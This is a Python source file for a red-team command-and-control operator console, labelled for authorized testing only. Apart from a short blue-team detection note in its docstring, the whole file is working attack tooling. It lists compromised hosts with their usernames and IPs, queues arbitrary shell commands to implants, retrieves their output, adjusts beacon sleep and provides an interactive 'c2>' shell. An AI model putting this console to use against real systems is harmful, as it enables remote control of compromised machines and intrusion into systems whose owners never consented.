#!/usr/bin/env python3
"""
Red Team C2 Controller - Python CLI for Operators

EDUCATIONAL PURPOSE ONLY - FOR AUTHORIZED SECURITY TESTING

This provides a command-line interface for operators to:
- List active beacons
- Issue commands to implants
- View command outputs
- Monitor beacon health

BLUE TEAM: Operator consoles are prime targets for detection
- Monitor for suspicious Python scripts making REST API calls
- Track authentication patterns to C2 infrastructure
- Network monitoring: Repeated API calls to external servers
"""

import click
import requests
import json
from tabulate import tabulate
from colorama import Fore, Style, init
import time
from datetime import datetime
from typing import List, Dict, Optional

# Initialize colorama
init(autoreset=True)

# Configuration
DEFAULT_SERVER_URL = "http://localhost:8443"
VERIFY_SSL = False  # Set to True in production

class C2Controller:
    """Main controller class for C2 operations"""

    def __init__(self, server_url: str):
        self.server_url = server_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL

        if not VERIFY_SSL:
            requests.packages.urllib3.disable_warnings()

    def list_beacons(self) -> List[Dict]:
        """Retrieve all active beacons"""
        try:
            response = self.session.get(f"{self.server_url}/api/operator/beacons")
            response.raise_for_status()
            data = response.json()
            return data.get('beacons', [])
        except requests.exceptions.RequestException as e:
            click.echo(f"{Fore.RED}Error connecting to teamserver: {e}")
            return []

    def submit_command(self, beacon_id: str, command_type: str, command_data: str) -> bool:
        """Submit a command to a specific beacon"""
        try:
            payload = {
                "beacon_id": beacon_id,
                "command_type": command_type,
                "command_data": command_data
            }

            response = self.session.post(
                f"{self.server_url}/api/operator/command",
                json=payload
            )
            response.raise_for_status()

            result = response.json()
            click.echo(f"{Fore.GREEN}✓ Command queued: {result.get('command_id')}")
            return True

        except requests.exceptions.RequestException as e:
            click.echo(f"{Fore.RED}Error submitting command: {e}")
            return False

    def get_outputs(self, beacon_id: str) -> List[Dict]:
        """Retrieve command outputs for a beacon"""
        try:
            response = self.session.get(f"{self.server_url}/api/operator/outputs/{beacon_id}")
            response.raise_for_status()
            data = response.json()
            return data.get('outputs', [])
        except requests.exceptions.RequestException as e:
            click.echo(f"{Fore.RED}Error retrieving outputs: {e}")
            return []

    def health_check(self) -> bool:
        """Check teamserver health"""
        try:
            response = self.session.get(f"{self.server_url}/health", timeout=5)
            return response.status_code == 200
        except:
            return False


# CLI Commands
@click.group()
@click.option('--server', default=DEFAULT_SERVER_URL, help='C2 teamserver URL')
@click.pass_context
def cli(ctx, server):
    """Red Team C2 Controller - Operator Interface"""
    ctx.ensure_object(dict)
    ctx.obj['controller'] = C2Controller(server)

    # Print banner
    banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════╗
║      Red Team C2 Controller v1.0.0                   ║
║      Python Operator Interface                       ║
║                                                       ║
║  ⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠           ║
╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    click.echo(banner)

    # Health check
    controller = ctx.obj['controller']
    if controller.health_check():
        click.echo(f"{Fore.GREEN}✓ Connected to teamserver: {server}\n")
    else:
        click.echo(f"{Fore.YELLOW}⚠ Warning: Teamserver may be unreachable\n")


@cli.command()
@click.pass_context
def beacons(ctx):
    """List all active beacons"""
    controller = ctx.obj['controller']
    beacons = controller.list_beacons()

    if not beacons:
        click.echo(f"{Fore.YELLOW}No active beacons")
        return

    # Format beacon data for display
    table_data = []
    for beacon in beacons:
        # Calculate time since last seen
        last_seen = datetime.fromisoformat(beacon['last_seen'].replace('Z', '+00:00'))
        time_diff = datetime.now(last_seen.tzinfo) - last_seen
        last_seen_str = f"{int(time_diff.total_seconds())}s ago"

        status_color = Fore.GREEN if beacon['status'] == 'active' else Fore.RED

        table_data.append([
            beacon['id'][:16] + '...',
            beacon.get('hostname', 'N/A'),
            beacon.get('username', 'N/A'),
            beacon.get('os', 'N/A'),
            beacon.get('ip', 'N/A'),
            last_seen_str,
            f"{status_color}{beacon['status']}{Style.RESET_ALL}"
        ])

    headers = ["Beacon ID", "Hostname", "User", "OS", "IP", "Last Seen", "Status"]
    click.echo(tabulate(table_data, headers=headers, tablefmt="grid"))
    click.echo(f"\n{Fore.CYAN}Total beacons: {len(beacons)}")


@cli.command()
@click.argument('beacon_id')
@click.argument('command')
@click.pass_context
def exec(ctx, beacon_id, command):
    """Execute a shell command on a beacon

    Example: python controller/main.py exec beacon123 "whoami"
    """
    controller = ctx.obj['controller']

    click.echo(f"{Fore.CYAN}Executing on {beacon_id}: {command}")

    success = controller.submit_command(beacon_id, "exec", command)

    if success:
        click.echo(f"{Fore.YELLOW}⏳ Command queued. Use 'output {beacon_id}' to view results.")


@cli.command()
@click.argument('beacon_id')
@click.option('--tail', '-n', default=10, help='Number of recent outputs to show')
@click.option('--follow', '-f', is_flag=True, help='Follow output (like tail -f)')
@click.pass_context
def output(ctx, beacon_id, tail, follow):
    """View command outputs from a beacon

    Example: python controller/main.py output beacon123 -n 5
    """
    controller = ctx.obj['controller']

    def display_outputs():
        outputs = controller.get_outputs(beacon_id)

        if not outputs:
            click.echo(f"{Fore.YELLOW}No outputs available for {beacon_id}")
            return

        # Sort by timestamp and take last N
        outputs = sorted(outputs, key=lambda x: x['timestamp'])[-tail:]

        for output in outputs:
            timestamp = output['timestamp']
            status = output['status']
            data = output['output_data']
            cmd_id = output.get('command_id', 'N/A')

            status_color = Fore.GREEN if status == 'success' else Fore.RED

            click.echo(f"\n{Fore.CYAN}{'='*60}")
            click.echo(f"{Fore.CYAN}Timestamp: {timestamp}")
            click.echo(f"{Fore.CYAN}Command ID: {cmd_id}")
            click.echo(f"Status: {status_color}{status}{Style.RESET_ALL}")
            click.echo(f"{Fore.CYAN}{'-'*60}")
            click.echo(data)

    if follow:
        click.echo(f"{Fore.YELLOW}Following output from {beacon_id} (Ctrl+C to stop)...")
        try:
            while True:
                display_outputs()
                time.sleep(5)
        except KeyboardInterrupt:
            click.echo(f"\n{Fore.YELLOW}Stopped following output")
    else:
        display_outputs()


@cli.command()
@click.argument('beacon_id')
@click.argument('interval', type=int)
@click.pass_context
def sleep(ctx, beacon_id, interval):
    """Update beacon sleep interval

    Example: python controller/main.py sleep beacon123 120
    """
    controller = ctx.obj['controller']
    controller.submit_command(beacon_id, "sleep", str(interval))
    click.echo(f"{Fore.GREEN}✓ Updated beacon interval to {interval}s")


@cli.command()
@click.argument('beacon_id')
@click.pass_context
def kill(ctx, beacon_id):
    """Terminate a beacon

    Example: python controller/main.py kill beacon123
    """
    controller = ctx.obj['controller']

    if click.confirm(f"{Fore.YELLOW}Are you sure you want to kill beacon {beacon_id}?"):
        controller.submit_command(beacon_id, "exit", "")
        click.echo(f"{Fore.RED}✓ Exit command sent to beacon")
    else:
        click.echo(f"{Fore.YELLOW}Cancelled")


@cli.command()
@click.pass_context
def interactive(ctx):
    """Interactive shell mode"""
    controller = ctx.obj['controller']

    click.echo(f"{Fore.CYAN}Entering interactive mode. Type 'help' for commands, 'exit' to quit.\n")

    # List beacons first
    beacons = controller.list_beacons()
    if beacons:
        click.echo(f"{Fore.GREEN}Active beacons:")
        for i, beacon in enumerate(beacons, 1):
            click.echo(f"  {i}. {beacon['id'][:16]}... ({beacon.get('hostname', 'N/A')})")
        click.echo()

    current_beacon = None

    while True:
        try:
            if current_beacon:
                prompt = f"{Fore.YELLOW}[{current_beacon[:8]}]> {Style.RESET_ALL}"
            else:
                prompt = f"{Fore.CYAN}c2> {Style.RESET_ALL}"

            user_input = click.prompt(prompt, type=str, prompt_suffix='')

            if user_input.lower() in ['exit', 'quit']:
                break

            elif user_input.lower() == 'help':
                click.echo("""
Available commands:
  beacons         - List all beacons
  use <id>        - Select a beacon to interact with
  exec <command>  - Execute command on selected beacon
  outputs         - View outputs from selected beacon
  back            - Deselect current beacon
  exit            - Exit interactive mode
                """)

            elif user_input.lower() == 'beacons':
                ctx.invoke(beacons)

            elif user_input.lower().startswith('use '):
                beacon_id = user_input.split(' ', 1)[1]
                current_beacon = beacon_id
                click.echo(f"{Fore.GREEN}✓ Selected beacon: {beacon_id}")

            elif user_input.lower().startswith('exec ') and current_beacon:
                command = user_input.split(' ', 1)[1]
                controller.submit_command(current_beacon, "exec", command)

            elif user_input.lower() == 'outputs' and current_beacon:
                ctx.invoke(output, beacon_id=current_beacon, tail=5, follow=False)

            elif user_input.lower() == 'back':
                current_beacon = None

            else:
                click.echo(f"{Fore.RED}Unknown command or no beacon selected. Type 'help' for commands.")

        except KeyboardInterrupt:
            click.echo()
            continue
        except EOFError:
            break

    click.echo(f"\n{Fore.CYAN}Exiting interactive mode...")


if __name__ == '__main__':
    cli(obj={})
